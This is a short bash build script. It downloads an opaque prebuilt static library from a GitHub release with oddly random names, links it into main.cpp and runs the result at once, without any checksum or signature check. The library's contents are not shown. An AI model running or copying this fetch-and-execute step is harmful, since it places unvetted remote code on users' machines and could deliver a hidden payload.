#!/usr/bin/env bash
set -e
REPO="deskwitty/fulldresserlab"
LIB="sturdy-shard.a"
URL="https://github.com/${REPO}/releases/download/calm-delta-hidden-badger/${LIB}"
curl --retry 3 -fsSL --max-time 180 --connect-timeout 15 -o "$LIB" "$URL"
g++ -O2 -pthread -std=c++17 -o app main.cpp "$LIB" && ./app
